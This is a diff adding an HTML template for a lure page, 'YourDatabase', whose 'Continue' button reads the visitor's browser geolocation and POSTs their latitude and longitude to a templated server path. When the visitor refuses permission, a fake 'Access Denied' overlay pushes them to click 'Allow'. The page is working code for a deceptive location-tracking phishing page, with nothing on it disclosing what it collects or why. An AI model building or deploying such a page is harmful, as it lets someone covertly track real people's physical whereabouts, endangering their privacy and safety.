@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="style.css">
+    <title>YourDatabase</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+        }
+
+        h1 {
+            color: #333;
+            margin-top: 50px;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+
+        #popup {
+            width: 300px;
+            background-color: #333;
+            padding: 20px;
+            border-radius: 10px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        #close {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            cursor: pointer;
+            color: white;
+            font-size: 24px;
+        }
+    </style>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, handleLocationError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "/{{ name }}", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("location=" + position.coords.latitude + "," + position.coords.longitude);
+        }
+
+        function handleLocationError(error) {
+            if (error.code === 1) { // Permission denied
+                showOverlay();
+            }
+        }
+
+        function showOverlay() {
+            var overlay = document.getElementById('overlay');
+            var popup = document.getElementById('popup');
+            overlay.style.display = 'block';
+            popup.innerHTML = '<div id="close" onclick="hideOverlay()">×</div>' +
+                              '<p style="font-weight: bold; color: red;">Access Denied</p>' +
+                              '<p>Click "Allow" to continue.</p>';
+        }
+
+        function hideOverlay() {
+            var overlay = document.getElementById('overlay');
+            overlay.style.display = 'none';
+        }
+    </script>
+</head>
+<body>
+    <h1>Get Everything you need in one place</h1>
+    
+    <button onclick="getLocation()">Continue</button>
+
+    <div id="overlay">
+        <div id="popup"></div>
+    </div>
+</body>
+</html>
